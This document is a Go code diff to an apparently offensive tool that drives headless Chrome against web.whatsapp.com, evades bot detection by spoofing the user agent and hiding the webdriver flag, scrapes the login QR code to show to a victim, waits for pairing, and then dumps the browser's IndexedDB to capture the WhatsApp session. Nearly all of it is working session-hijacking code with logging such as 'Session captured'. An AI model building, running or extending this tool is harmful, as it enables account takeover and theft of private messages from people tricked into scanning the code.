@@ -10,7 +10,6 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
-	"sync"
 	"sync/atomic"
 	"time"
 
@@ -52,6 +51,22 @@ func startChrome(ctx context.Context, userDir string) (context.Context, context.
 		chromedp.Flag("ozone-platform", "wayland"),
 		chromedp.NoFirstRun,
 		chromedp.NoDefaultBrowserCheck,
+		chromedp.UserDataDir(userDir),
+		chromedp.WindowSize(1280, 900),
+	}
+	allocCtx, allocCancel := chromedp.NewExecAllocator(ctx, opts...)
+	ctx2, cancel := chromedp.NewContext(allocCtx)
+	return ctx2, cancel, allocCancel, nil
+}
+
+func startChromeHeadless(ctx context.Context, userDir string) (context.Context, context.CancelFunc, context.CancelFunc, error) {
+	opts := []chromedp.ExecAllocatorOption{
+		chromedp.NoSandbox,
+		chromedp.Flag("disable-gpu", true),
+		chromedp.Flag("ozone-platform", "wayland"),
+		chromedp.NoFirstRun,
+		chromedp.NoDefaultBrowserCheck,
+		chromedp.Flag("headless", true),
 		chromedp.UserDataDir(userDir),
 		chromedp.WindowSize(1280, 900),
 	}
@@ -104,6 +119,69 @@ func launchChromeAttack(cfg attackCfg) {
 	os.Unsetenv("DISPLAY")
 	sudoFixEnv()
 
+	userDir, err := os.MkdirTemp("", "whatsapp-chrome-*")
+	if err != nil {
+		srv.Close()
+		srvSt.mu.Lock()
+		srvSt.running = false
+		srvSt.mu.Unlock()
+		return
+	}
+
+	attackSt.mu.Lock()
+	attackSt.qrCode = ""
+	attackSt.qrImage = nil
+	attackSt.errorMsg = ""
+	attackSt.paired = false
+	attackSt.mu.Unlock()
+
+	allocCtx, allocCancel := chromedp.NewExecAllocator(ctx,
+		chromedp.NoSandbox,
+		chromedp.Flag("disable-gpu", true),
+		chromedp.Flag("ozone-platform", "wayland"),
+		chromedp.NoFirstRun,
+		chromedp.NoDefaultBrowserCheck,
+		chromedp.Flag("headless", true),
+		chromedp.Flag("disable-blink-features", "AutomationControlled"),
+		chromedp.UserAgent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
+		chromedp.UserDataDir(userDir),
+		chromedp.WindowSize(1280, 900),
+	)
+	defer allocCancel()
+
+	browserCtx, browserCancel := chromedp.NewContext(allocCtx)
+	defer browserCancel()
+
+	fmt.Println("[*] Loading web.whatsapp.com...")
+	if err := chromedp.Run(browserCtx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
+		fmt.Printf("[!] Navigate failed: %v\n", err)
+		srv.Close()
+		srvSt.mu.Lock()
+		srvSt.running = false
+		srvSt.mu.Unlock()
+		os.RemoveAll(userDir)
+		return
+	}
+
+	chromedp.Run(browserCtx, chromedp.Evaluate(`Object.defineProperty(navigator, 'webdriver', {get: () => undefined})`, nil))
+
+	fmt.Println("[*] Waiting for QR canvas...")
+	if err := chromedp.Run(browserCtx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
+		fmt.Printf("[!] Canvas wait failed: %v\n", err)
+		srv.Close()
+		srvSt.mu.Lock()
+		srvSt.running = false
+		srvSt.mu.Unlock()
+		os.RemoveAll(userDir)
+		return
+	}
+	fmt.Println("[+] QR canvas detected, polling for pairing (up to 120s)...")
+
+	timeout := time.After(120 * time.Second)
+	tick := time.NewTicker(3 * time.Second)
+	defer tick.Stop()
+
+pairLoop:
 	for {
 		select {
 		case <-ctx.Done():
@@ -111,115 +189,78 @@ func launchChromeAttack(cfg attackCfg) {
 			srvSt.mu.Lock()
 			srvSt.running = false
 			srvSt.mu.Unlock()
+			os.RemoveAll(userDir)
 			return
-		default:
-		}
-
-		userDir, err := os.MkdirTemp("", "whatsapp-chrome-*")
-		if err != nil {
-			time.Sleep(2 * time.Second)
-			continue
-		}
-
-		attackSt.mu.Lock()
-		attackSt.qrCode = ""
-		attackSt.qrImage = nil
-		attackSt.errorMsg = ""
-		attackSt.paired = false
-		attackSt.mu.Unlock()
-
-		browserCtx, browserCancel, allocCancel, err := startChrome(ctx, userDir)
-		if err != nil {
-			os.RemoveAll(userDir)
-			time.Sleep(2 * time.Second)
-			continue
-		}
-
-		if err := chromedp.Run(browserCtx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
-			browserCancel()
-			allocCancel()
-			os.RemoveAll(userDir)
-			time.Sleep(2 * time.Second)
-			continue
-		}
-		if err := chromedp.Run(browserCtx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
-			browserCancel()
-			allocCancel()
-			os.RemoveAll(userDir)
-			time.Sleep(2 * time.Second)
-			continue
-		}
-
-		done := make(chan struct{})
-		var closeOnce sync.Once
-
-		go func() {
-			for {
-				select {
-				case <-done:
-					return
-				case <-time.After(2 * time.Second):
-				}
-
-				var hasCanvas bool
-				_ = chromedp.Run(browserCtx, chromedp.Evaluate(`!!document.querySelector('canvas')`, &hasCanvas))
-				if !hasCanvas {
-					attackSt.mu.Lock()
-					attackSt.paired = true
-					attackSt.mu.Unlock()
-					closeOnce.Do(func() { close(done) })
-					return
-				}
-
-				var dataURL string
-				err := chromedp.Run(browserCtx, chromedp.Evaluate(
-					`document.querySelector('canvas').toDataURL('image/png')`,
-					&dataURL,
-					func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
-						return p.WithAwaitPromise(true)
-					},
-				))
-				if err == nil && len(dataURL) > 22 {
-					b64 := dataURL[22:]
-					imgData, decErr := base64.StdEncoding.DecodeString(b64)
-					if decErr == nil {
-						attackSt.mu.Lock()
-						attackSt.qrImage = imgData
-						attackSt.qrCode = "active"
-						attackSt.mu.Unlock()
-					}
-				}
-			}
-		}()
-
-		select {
-		case <-done:
-			time.Sleep(3 * time.Second)
-			saveChromeSession(browserCtx, userDir)
-			browserCancel()
-			allocCancel()
-			os.RemoveAll(userDir)
-
+		case <-timeout:
+			fmt.Println("\n[!] Timed out waiting for pairing.")
+			srv.Close()
 			srvSt.mu.Lock()
-			srvSt.sessionCnt++
+			srvSt.running = false
 			srvSt.mu.Unlock()
-			atomic.StoreInt32(&newSessionNote, 1)
-
-		case <-time.After(120 * time.Second):
-			closeOnce.Do(func() { close(done) })
-			browserCancel()
-			allocCancel()
 			os.RemoveAll(userDir)
-			time.Sleep(2 * time.Second)
+			return
+		case <-tick.C:
+		}
+
+		var hasCanvas bool
+		if err := chromedp.Run(browserCtx, chromedp.Evaluate(`!!document.querySelector('canvas')`, &hasCanvas)); err != nil {
 			continue
+		}
+		if !hasCanvas {
+			attackSt.mu.Lock()
+			attackSt.paired = true
+			attackSt.mu.Unlock()
+			fmt.Println("[+] QR canvas gone — paired!")
+			break pairLoop
+		}
 
-		case <-ctx.Done():
-			closeOnce.Do(func() { close(done) })
-			browserCancel()
-			allocCancel()
-			os.RemoveAll(userDir)
+		var dataURL string
+		err := chromedp.Run(browserCtx, chromedp.Evaluate(
+			`(function(){try{return document.querySelector('canvas').toDataURL('image/png')}catch(e){return 'err:'+e.message}})()`,
+			&dataURL,
+			func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
+				return p.WithAwaitPromise(true)
+			},
+		))
+		if err != nil {
+			attackSt.mu.Lock()
+			attackSt.errorMsg = err.Error()
+			attackSt.mu.Unlock()
+			continue
+		}
+		if len(dataURL) > 22 {
+			b64 := dataURL[22:]
+			imgData, decErr := base64.StdEncoding.DecodeString(b64)
+			if decErr == nil {
+				attackSt.mu.Lock()
+				attackSt.qrImage = imgData
+				attackSt.qrCode = "active"
+				attackSt.mu.Unlock()
+			}
+		} else if strings.HasPrefix(dataURL, "err:") {
+			attackSt.mu.Lock()
+			attackSt.errorMsg = dataURL
+			attackSt.mu.Unlock()
 		}
 	}
+
+	time.Sleep(3 * time.Second)
+	fmt.Println("[*] Dumping IndexedDB...")
+	saveChromeSession(browserCtx, userDir)
+	browserCancel()
+	os.RemoveAll(userDir)
+
+	srvSt.mu.Lock()
+	srvSt.sessionCnt++
+	srvSt.lastSession = "chrome"
+	srvSt.mu.Unlock()
+	atomic.StoreInt32(&newSessionNote, 1)
+
+	fmt.Println("\n[+] Session captured. Server stopped.")
+	srv.Close()
+	srvSt.mu.Lock()
+	srvSt.running = false
+	srvSt.mu.Unlock()
 }
 
 func saveChromeSession(browserCtx context.Context, userDir string) {
